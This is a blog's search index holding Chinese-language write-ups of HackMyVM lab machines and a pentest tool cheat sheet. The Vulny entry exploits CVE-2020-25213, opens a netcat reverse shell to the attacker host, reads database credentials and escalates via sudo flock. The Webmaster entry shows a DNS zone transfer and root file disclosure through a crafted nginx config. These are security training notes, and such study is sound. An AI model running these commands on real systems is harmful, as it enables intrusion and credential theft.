<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>hackmyvm-vulny</title>
      <link href="/2025/07/03/hackmyvm-vulny/"/>
      <url>/2025/07/03/hackmyvm-vulny/</url>
      
        <content type="html"><![CDATA[<h2 id="一、端口扫描"><a href="#一、端口扫描" class="headerlink" title="一、端口扫描"></a>一、端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.56.106</span><br><span class="line">80/tcp open  http</span><br></pre></td></tr></table></figure><p>只开放了80端口</p><h2 id="二、目录扫描与路径枚举"><a href="#二、目录扫描与路径枚举" class="headerlink" title="二、目录扫描与路径枚举"></a>二、目录扫描与路径枚举</h2><p>直接访问 <code>http://192.168.56.106</code> 显示 Ubuntu 默认页面。</p><p>使用 gobuster 扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line"></span><br><span class="line">/secret               (Status: 301)  [Size: 317]  [--&gt; http://192.168.56.106/secret/]</span><br></pre></td></tr></table></figure><p>进一步扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106/secret -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br><span class="line"></span><br><span class="line">/wp-admin             (Status: 301) [Size: 326]  [--&gt; http://192.168.56.106/secret/wp-admin/]</span><br><span class="line">/wp-includes          (Status: 301) [Size: 329]  [--&gt; http://192.168.56.106/secret/wp-includes/]</span><br><span class="line">/wp-content           (Status: 301) [Size: 328]  [--&gt; http://192.168.56.106/secret/wp-content/]</span><br><span class="line">/wp-settings.php      (Status: 500) [Size: 0]</span><br></pre></td></tr></table></figure><p>访问&#x2F;secret发现是一个wordpress服务，并且报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Neither /etc/wordpress/config-192.168.56.106.php nor /etc/wordpress/config-168.56.106.php could be found.</span><br><span class="line">Ensure one of them exists, is readable by the webserver and contains the right password/username.</span><br></pre></td></tr></table></figure><h2 id="三、插件泄露与漏洞利用"><a href="#三、插件泄露与漏洞利用" class="headerlink" title="三、插件泄露与漏洞利用"></a>三、插件泄露与漏洞利用</h2><p>跟进访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.106/secret/wp-content/uploads/2020/10/</span><br></pre></td></tr></table></figure><p>发现插件包并且确定版本6.0：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wp-file-manager-6.0.zip</span><br></pre></td></tr></table></figure><p>这是 WordPress 的插件 <code>wp-file-manager</code>，存在 CVE-2020-25213：</p><blockquote><p><code>wp-file-manager &lt;= 6.8</code> 存在未授权文件上传漏洞，可远程命令执行。</p></blockquote><p>使用 <code>searchsploit</code> 查找漏洞利用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wp-file-manager</span><br><span class="line">searchsploit -m php/webapps/51224.py</span><br><span class="line">python3 51224.py http://192.168.56.106/secret <span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure><p>漏洞利用成功，之后反弹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 51224.py http://192.168.56.106/secret <span class="string">&quot;busybox nc 192.168.56.102 6666 -e sh&quot;</span></span><br></pre></td></tr></table></figure><h2 id="四、信息收集"><a href="#四、信息收集" class="headerlink" title="四、信息收集"></a>四、信息收集</h2><p>前面报错&#x2F;etc&#x2F;wordpress路径，然后看一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">www-data@vulny:/etc/wordpress$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">config-192.168.1.122.php  htaccess</span><br><span class="line">www-data@vulny:/etc/wordpress$ <span class="built_in">cat</span> config-192.168.1.122.php</span><br><span class="line"><span class="built_in">cat</span> config-192.168.1.122.php</span><br><span class="line">&lt;?php</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;myfuckingpassword&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;utf8_general_ci&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/wp-content&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后看wordpress的配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordpress/wp-config.php</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * WordPress&#x27;s Debianised default master config file</span></span><br><span class="line"><span class="comment"> * Please do NOT edit and learn how the configuration works in</span></span><br><span class="line"><span class="comment"> * /usr/share/doc/wordpress/README.Debian</span></span><br><span class="line"><span class="comment"> ***/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up a host-specific config file in</span></span><br><span class="line"><span class="comment"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/:.*/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]);</span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.\-]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">/* Main site in case of multisite with subdomains */</span></span><br><span class="line"><span class="variable">$debian_main_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/^[^.]*\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_main_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_main_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_main_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_main_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_main_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Neither &lt;b&gt;<span class="subst">$debian_file</span>&lt;/b&gt; nor &lt;b&gt;<span class="subst">$debian_main_file</span>&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* idrinksomewater */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for some constants if they have not yet been set</span></span><br><span class="line"><span class="comment">   by the host-specific config files */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ABSPATH&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_NAME&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_USER&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_HOST&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DONT_SET_WP_CONTENT_DIR&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/var/lib/wordpress/wp-content&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for the table_prefix variable so that it doesn&#x27;t need to</span></span><br><span class="line"><span class="comment">   be put in every host-specific config file */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$table_prefix</span>)) &#123;</span><br><span class="line">    <span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>] == <span class="string">&#x27;https&#x27;</span>)</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] = <span class="string">&#x27;on&#x27;</span>;</span><br></pre></td></tr></table></figure><p>文件中有个特别注释：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* idrinksomewater */</span></span><br></pre></td></tr></table></figure><p>结合&#x2F;home下的用户名作为登录凭据</p><h2 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">(ALL : ALL) NOPASSWD: /usr/bin/flock</span><br></pre></td></tr></table></figure><p>使用 <code>flock</code> 提权：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> flock -u / /bin/sh</span><br></pre></td></tr></table></figure><p>flock [选项] &lt;锁文件&gt; &lt;命令&gt;<br>这里的-u &#x2F;并不影响，重要的是root权限执行了flock，然后后面通过flock执行的命令就也是root权限。<br>以root权限解锁根目录并执行&#x2F;bin&#x2F;sh。<br>成功获取 root shell。</p><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><ul><li>插件泄露 + CVE-2020-25213</li><li>服务的配置文件查询</li><li>flock提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-webmaster</title>
      <link href="/2025/07/02/hackmyvm-webmaster/"/>
      <url>/2025/07/02/hackmyvm-webmaster/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.105</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">53/tcp open  domain  Eero device dnsd</span><br><span class="line">80/tcp open  http    nginx 1.14.2</span><br></pre></td></tr></table></figure><p>53 端口为 DNS 服务，80 端口为 nginx Web 服务。</p><h2 id="二、DNS-Zone-Transfer-信息泄露"><a href="#二、DNS-Zone-Transfer-信息泄露" class="headerlink" title="二、DNS Zone Transfer 信息泄露"></a>二、DNS Zone Transfer 信息泄露</h2><p>首先看80端口</p><p>利用 <code>dig</code> 工具进行 DNS 区域传送（AXFR）测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">AXFR（Zone Transfer）是 DNS 用于把整个 Zone 批量同步给别人的协议。</span><br><span class="line">如果 DNS 管理员没加限制，AXFR 就相当于说：</span><br><span class="line">“我只要知道你叫啥名字（domain），然后敲个门（dig），你就把你家的全体成员名单 + 内网地址 + 邮件通道都告诉我。”</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dig @192.168.56.105 webmaster.hmv AXFR +tcp</span><br><span class="line"></span><br><span class="line">webmaster.hmv.      IN SOA   ns1.webmaster.hmv. root.webmaster.hmv. ...</span><br><span class="line">ftp.webmaster.hmv.  IN CNAME www.webmaster.hmv.</span><br><span class="line">john.webmaster.hmv. IN TXT   <span class="string">&quot;Myhiddenpazzword&quot;</span></span><br><span class="line">mail.webmaster.hmv. IN A     192.168.0.12</span><br><span class="line">ns1.webmaster.hmv.  IN A     127.0.0.1</span><br><span class="line">www.webmaster.hmv.  IN A     192.168.0.11</span><br></pre></td></tr></table></figure><p>发现：<br><code>john.webmaster.hmv</code> 的 包含，TXT 和疑似密码 <code>Myhiddenpazzword</code>，测试john作为用户名 SSH 登录。</p><h2 id="三、SSH-登录"><a href="#三、SSH-登录" class="headerlink" title="三、SSH 登录"></a>三、SSH 登录</h2><p>使用用户名 <code>john</code> 和从 DNS TXT 记录获得的密码尝试登录 SSH：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh john@192.168.56.105</span><br></pre></td></tr></table></figure><p>成功登录后，发现用户家目录有 <code>flag.sh</code>，直接读flag的，但是只能读取权限内的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line">(ALL : ALL) NOPASSWD: /usr/sbin/nginx</span><br></pre></td></tr></table></figure><p>这里是知识盲区，之后看大佬wp，要写nginx恶意配置文件</p><h2 id="四、利用-nginx-配置提权"><a href="#四、利用-nginx-配置提权" class="headerlink" title="四、利用 nginx 配置提权"></a>四、利用 nginx 配置提权</h2><p>创建恶意 nginx 配置文件 <code>nginx.conf</code>，内容如下：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">user</span> root;</span><br><span class="line"><span class="attribute">worker_processes</span> <span class="number">4</span>;</span><br><span class="line"><span class="attribute">pid</span> /tmp/nginx.pid;</span><br><span class="line"></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">768</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span> <span class="number">1234</span>;</span><br><span class="line">        <span class="attribute">root</span> /;</span><br><span class="line">        <span class="attribute">autoindex</span> <span class="literal">on</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置说明：</p><ul><li>以 <code>root</code> 用户启动 nginx worker 进程。</li><li>监听端口 <code>1234</code>。</li><li>根目录设置为系统根目录 <code>/</code>。</li><li>开启目录浏览功能 <code>autoindex on</code>。</li></ul><p>使用 sudo 权限运行 nginx 并加载该配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/sbin/nginx -c /home/john/nginx.conf</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.105:1234/root/root.txt</span><br></pre></td></tr></table></figure><p>即可读取 root 权限下敏感文件，实现文件泄露。</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><ul><li>DNS Zone Transfer 利用</li><li>恶意 nginx 配置</li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> hackmyvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tools</title>
      <link href="/2025/07/02/tools/"/>
      <url>/2025/07/02/tools/</url>
      
        <content type="html"><![CDATA[<h2 id="1-gobuster"><a href="#1-gobuster" class="headerlink" title="1.gobuster"></a>1.gobuster</h2><h3 id="1-1-dir"><a href="#1-1-dir" class="headerlink" title="1.1 dir"></a>1.1 dir</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -x php,txt -t 50</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>dir</td><td>目录扫描模式</td></tr><tr><td>-u</td><td>指定目标url</td></tr><tr><td>-w</td><td>指定字典</td></tr><tr><td>-x</td><td>添加文件后缀名</td></tr><tr><td>-t</td><td>指定并发扫描的线程数量</td></tr></tbody></table><h2 id="2-hydra"><a href="#2-hydra" class="headerlink" title="2.hydra"></a>2.hydra</h2><p>hydra -L up.txt -p up.txt ssh:&#x2F;&#x2F;192.168.56.104:2222 -V</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-L</td><td>指定用户名字典</td></tr><tr><td>-l</td><td>指定用户名</td></tr><tr><td>-P</td><td>指定密码字典</td></tr><tr><td>-p</td><td>指定密码</td></tr><tr><td>-V</td><td>输出每一次尝试爆破的用户名和密码以及结果</td></tr></tbody></table><h2 id="3-stegseek"><a href="#3-stegseek" class="headerlink" title="3.stegseek"></a>3.stegseek</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb</span><br><span class="line"><span class="built_in">sudo</span> apt install ./stegseek_0.6-1.deb</span><br></pre></td></tr></table></figure><p>kali最新版本需要安装旧依赖<br>wget <a href="http://archive.debian.org/debian/pool/main/m/mhash/libmhash2_0.9.9.9-7+b1_amd64.deb">http://archive.debian.org/debian/pool/main/m/mhash/libmhash2_0.9.9.9-7+b1_amd64.deb</a><br>wget <a href="http://archive.debian.org/debian/pool/main/libm/libmcrypt/libmcrypt4_2.5.8-3.4_amd64.deb">http://archive.debian.org/debian/pool/main/libm/libmcrypt/libmcrypt4_2.5.8-3.4_amd64.deb</a><br>sudo dpkg -i libmhash2_0.9.9.9-7+b1_amd64.deb<br>sudo dpkg -i libmcrypt4_2.5.8-3.4_amd64.deb</p><p>stegseek -wl &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt cat-hidden.jpg </p><table><thead><tr><th>参数</th><th>作用</th><th></th></tr></thead><tbody><tr><td>-wl</td><td>指定字典爆破密码</td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h2 id="4-dig"><a href="#4-dig" class="headerlink" title="4.dig"></a>4.dig</h2><p><code>dig</code>（Domain Information Groper）是一个DNS 查询工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig [@DNS服务器] [域名] [记录类型] [参数...]</span><br></pre></td></tr></table></figure><table><thead><tr><th>类型</th><th>含义</th></tr></thead><tbody><tr><td>A</td><td>主机地址（IPv4）</td></tr><tr><td>AAAA</td><td>主机地址（IPv6）</td></tr><tr><td>MX</td><td>邮件服务器记录</td></tr><tr><td>NS</td><td>授权名称服务器</td></tr><tr><td>CNAME</td><td>规范名称（别名）</td></tr><tr><td>TXT</td><td>文本记录（SPF&#x2F;验证信息）</td></tr><tr><td>SOA</td><td>Start of Authority（起始权威）</td></tr><tr><td>AXFR</td><td>区域传送（Zone Transfer）</td></tr></tbody></table><table><thead><tr><th>参数</th><th>功能说明</th></tr></thead><tbody><tr><td><code>+short</code></td><td>只显示简洁的答案（比如 IP 地址）</td></tr><tr><td><code>+tcp</code></td><td>使用 TCP 协议（⚠️AXFR 必须使用 TCP）</td></tr><tr><td><code>+noquestion</code></td><td>不显示查询问题部分（请求行）</td></tr><tr><td><code>+nocomments</code></td><td>不显示注释</td></tr><tr><td><code>+nostats</code></td><td>不显示统计信息</td></tr><tr><td><code>+nocmd</code></td><td>不显示命令提示头</td></tr><tr><td><code>+multiline</code></td><td>美化输出格式，多行展示</td></tr><tr><td><code>+trace</code></td><td>启用跟踪模式，从根服务器逐级查询域名</td></tr></tbody></table><h2 id="5-searchsploit"><a href="#5-searchsploit" class="headerlink" title="5.searchsploit"></a>5.searchsploit</h2><p><code>searchsploit</code> 是一个命令行工具，用于在本地快速搜索 <strong>Exploit Database</strong> 中已知的漏洞利用代码（PoC）和漏洞信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit wp-file-manager</span><br><span class="line"></span><br><span class="line">searchsploit -m php/webapps/51224.py</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td><code>-u</code></td><td>更新本地数据库（相当于 <code>git pull</code>）</td></tr><tr><td><code>-p</code></td><td>显示 Exploit 的完整路径</td></tr><tr><td><code>-x &lt;路径&gt;</code></td><td>直接显示 PoC 文件内容</td></tr><tr><td><code>-m &lt;路径&gt;</code></td><td>复制 PoC 到当前目录</td></tr><tr><td><code>--json</code></td><td>输出为 JSON 格式，便于脚本处理</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackmyvm-Twisted</title>
      <link href="/2025/07/02/hackmyvm-Twisted/"/>
      <url>/2025/07/02/hackmyvm-Twisted/</url>
      
        <content type="html"><![CDATA[<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV 192.168.56.104</span><br><span class="line">80/tcp   open  http    nginx 1.14.2</span><br><span class="line">2222/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2</span><br></pre></td></tr></table></figure><h2 id="二、Web-分析（端口-80）"><a href="#二、Web-分析（端口-80）" class="headerlink" title="二、Web 分析（端口 80）"></a>二、Web 分析（端口 80）</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 192.168.56.104</span><br></pre></td></tr></table></figure><p>返回页面内容提示对两张图片进行比较：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>I love cats!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-original.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat original&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>But I prefer this one because seems different<span 